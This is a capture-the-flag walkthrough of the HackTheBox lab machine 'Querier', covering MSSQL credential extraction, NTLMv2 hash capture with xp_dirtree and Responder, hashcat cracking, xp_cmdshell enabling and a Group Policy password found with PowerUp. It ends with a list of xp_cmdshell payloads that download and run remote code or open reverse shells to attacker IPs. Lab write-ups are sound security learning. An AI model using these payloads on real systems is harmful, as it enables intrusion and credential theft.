@@ -1,0 +1,202 @@
+Now Querier was a great box defintely was a fan of this one...
+
+/  __\/  __//  _ \  / \  /|/  _ \/ \   /    /  / \/ \  /|/__ __\/  __// \   / \   / \/  __//  __// \  /|/   _\/  __/  
+|  \/||  \  | | \|  | |  ||| / \|| |   |  __\  | || |\ ||  / \  |  \  | |   | |   | || |  _|  \  | |\ |||  /  |  \    
+|    /|  /_ | |_/|  | |/\||| \_/|| |_/\| |     | || | \||  | |  |  /_ | |_/\| |_/\| || |_//|  /_ | | \|||  \_ |  /_   
+\_/\_\\____\\____/  \_/  \|\____/\____/\_/     \_/\_/  \|  \_/  \____\\____/\____/\_/\____\\____\\_/  \|\____/\____\  
+                                                                                                                      
+10.10.10.125
+
+Querier
+ 
+OS - Windows
+
+core technology on this one is Microsoft SQL Server defintely enjoyed this one..
+
+Blogs soon to come and pictures to follow as well for now just text :(
+
+First I started like any other box in the hacker community you probe my friend you
+probe until it hurts lol. So below we can see some interesting ports open and you
+right from the jump have that hmmm. 
+
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-06 13:53 +00
+Nmap scan report for 10.10.10.125
+Host is up (0.059s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+1433/tcp open  ms-sql-s      Microsoft SQL Server  14.00.1000.00
+| ms-sql-ntlm-info: 
+|   Target_Name: HTB
+|   NetBIOS_Domain_Name: HTB
+|   NetBIOS_Computer_Name: QUERIER
+|   DNS_Domain_Name: HTB.LOCAL
+|   DNS_Computer_Name: QUERIER.HTB.LOCAL
+|   DNS_Tree_Name: HTB.LOCAL
+|_  Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2019-05-06T07:40:19
+|_Not valid after:  2049-05-06T07:40:19
+|_ssl-date: 2019-05-06T12:53:50+00:00; -59m53s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -59m53s, deviation: 0s, median: -59m53s
+| ms-sql-info: 
+|   10.10.10.125:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 
+|_    TCP port: 1433
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-05-06 12:53:52
+|_  start_date: N/A
+
+
+Using smbclient -L //10.10.10.125 lets check access to the box and if we 
+can find anything good. So I did I found right away on //10.10.10.125/Reports 
+need to extract something maybe..lets see lol
+
+In reports we find -
+
+Currency Volume Report.xlsm
+
+We then begin to dig and see its encrypted so using
+strings "Currency Volume Report.xlsm"
+
+I find this looking thru the file you must use excel to pull out the contents
+of the xlsm extentsion...
+
+SELECT * FROM volume;
+word>
+ MsgBox "connection successful"
+Set rs = conn.Execute("SELECT * @@version;")
+Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;
+Pwd=PcwTWTH*******
+
+Got it logging into using DBeaver using netntlmv2 setting
+finally was able to probe around the box using commands
+for MSSQL which below are some examples of me probing the box with differnt commands 
+
+I realized a key technique which hackers its a must know if you wanna crack some boxes
+in both real life and in CTF challenges so learn some xp_cmdshell commands and others you will see
+being used to accomplish the goal of privlage escalation sometimes there is more to the story that this. 
+
+EXEC volume.sys.xp_dirtree "C:\",1,1; - prints out directories can probe box with this to see
+what is going on..
+
+Next after playing with some commands and you may use different methods but here is how I nailed 
+the box. Next after making decisions on my next move I fired up responder and shout out to Ch3f 
+who loves that tool lmfao...
+
+For user ==================================================================================================
+
+Use whatever settings you have for ip and adapter typically in HTB is tun0
+
+EXEC Master.dbo.xp_DirTree"\\10.10.14.250:1234\x",1,1; - use with responder to capture hash
+
+[+] Listening for events...
+[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
+[SMBv2] NTLMv2-SSP Username : QUERIER\mssql-svc
+[SMBv2] NTLMv2-SSP Hash     : mssql-svc::QUERIER:5b3edf7e9541d41d:7C0AA13A8FCC22FA3213AA96F6E26AD7:0101000000000000C0653150DE09D20156883083D849C3B5000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000030000052204D90061F232383215F3E1141BBCE431B9DE891281E852A2D121254C75C0E0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310038003100000000000000000000000000
+[*] Skipping previously captured hash for QUERIER\mssql-svc
+[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
+[SMBv2] NTLMv2-SSP Username : \gX
+[SMBv2] NTLMv2-SSP Hash     : gX:::59790b436f2f2667::
+[+] Exiting...
+------------------------------------------------------------------------------------------------------------
+
+And sweet looks like we have some kind of hash for the mssql-svc user so lets move on and crack this
+hash and see what else we can get into on this box...
+
+hashcat64.exe -m 5600 hashes\hash.txt password_list.txt -o cracked\cracked.txt
+
+MSSQL-SVC::QUERIER:5b3edf7e9541d41d:7c0aa13a8fcc22fa3213aa96f6e26ad7:
+0101000000000000c0653150de09d20156883083d849c3b5000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d2010600040002000000080030003000000000000000000000000030000052204d90061f232383215f3e1141bbce431b9de891281e852a2d121254c75c0e0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00310038003100000000000000000000000000
+:corp****** got it! :)
+
+At first not going to lie I logged right back into sql and was trying from there at first thinking
+that was the way to priv esc and what I found was that after running some more mssql commands.
+
+I then used playing around these commands to see if I can get user this way or load files on the box -
+
+sp_configure 'show advanced option'
+
+EXEC sp_configure 'show advanced option', '1';  
+RECONFIGURE WITH OVERRIDE;
+
+sp_configure 'xp_cmdshell', '1';
+
+----------------------------------------------------------------------------------------------------------
+
+After more probing around I found a decent working exploit on github for a mssql shell to upload files 
+effective as thru mssql console or DBeaver it was rather difficult. 
+
+was able to get user after logging into db as the mssql-svc user and use the elevating commands above
+to enable file access thru cmdshell. 
+
+xp_cmdshell 'more C:\Users\mssql-svc\Desktop\User.txt'
+
+Then got user :)
+
+output                          |
+--------------------------------|
+c37b41bb669da34*****************|
+                                |
+
+After finally getting the new exploit shell found for mssql-svc user I was able to move around the box
+pretty well and like any other windows box the first things I could think of was some powershell scripts
+like PowerUP to get that admin user and root.
+
+
++++++============root and priv esc====================================================
+
+First I got PowerUp on the box and then began the music of probing the box
+and right away a found config file printed out at the end
+
+
+[*] Checking for cached Group Policy Preferences .xml files....
+None
+None
+Changed   : {2019-01-28 23:12:48}
+UserNames : {Administrator}
+NewName   : [BLANK]
+Passwords : {MyUnclesAreMario*********}
+File      : C:\ProgramData\Microsoft\Group 
+            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
+
+Shout out to Alamot for the exploit for mssql-svc as this gave me stability to upload files and execute
+them. Just google that name and github to find it..
+
+then logged into smb for quickness
+
+smbclient -U administrator //10.10.10.125/C$ 
+
+place in password then used get root.txt from Desktop -
+
+cat root.txt
+b19c3794f786a1fdcf***********
+
+Some example commands for cmdshell I tried but did not work here but good to know...
+----------------------------------------------------------------------------------------------------------
+[examples or stuff that may work elsewhere lol...]
+
+xp_cmdshell 'mshta.exe http://10.10.14.159:8080/4HxsxHJDuRZIsV.hta' didnt work :(
+xp_cmdshell 'curl http://10.10.14.250/443.exe'
+xp_cmdshell 'curl http://10.10.14.181:8080/0iHu91Ev' - example curl is enabled
+EXEC xp_cmdshell 'bash -i >& /dev/tcp/10.10.14.159/1234 0>&1'
+xp_cmdshell 'powershell -c "IEX(New-Object System.Net.WebClient).DownloadString("http://10.10.14.159/powercat.ps1");powercat -c 10.10.14.159 -p 443 -e cmd"'
+xp_cmdshell 'rundll32.exe \\10.10.14.159\EeAcNH\test.dll,0' 
+
+
+Be well and HTP always...
+
+C-3P0
+Red Wolf Intelligence
+-----------------------------------------------------------------------------------------------------------
